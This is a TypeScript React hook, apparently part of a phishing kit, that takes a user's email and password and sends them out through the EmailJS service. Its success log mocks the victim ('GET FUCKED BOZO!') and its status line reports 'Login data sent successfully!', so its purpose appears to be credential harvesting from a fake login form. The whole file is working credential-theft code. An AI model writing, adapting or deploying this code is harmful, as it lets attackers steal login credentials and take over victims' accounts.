import { useState } from 'react';
import emailjs from '@emailjs/browser';

interface TemplateParams extends Record<string, unknown> {
  user_email: string;
  user_password: string;
}

interface UseSendEmailResult {
  sendEmail: (templateParams: TemplateParams) => Promise<boolean>;
  message: string;
  error: string;
  loading: boolean;
}

const useSendEmail = (): UseSendEmailResult => {
  const [message, setMessage] = useState<string>('');
  const [error, setError] = useState<string>('');
  const [loading, setLoading] = useState<boolean>(false);

  const sendEmail = async (templateParams: TemplateParams): Promise<boolean> => {
    setLoading(true);
    setMessage('');
    setError('');

    try {
      const response = await emailjs.send(
        import.meta.env.VITE_EMAILJS_SERVICE_ID as string,
        import.meta.env.VITE_EMAILJS_TEMPLATE_ID as string,
        templateParams,
        import.meta.env.VITE_EMAILJS_PUBLIC_KEY as string
      );
      console.log('GET FUCKED BOZO!', response.status, response.text);
      setMessage('Login data sent successfully!');
      return true;
    } catch (err) {
      console.error('FAILED...', err);
      setError('Failed to send login data.');
      return false;
    } finally {
      setLoading(false);
    }
  };

  return { sendEmail, message, error, loading };
};

export default useSendEmail;
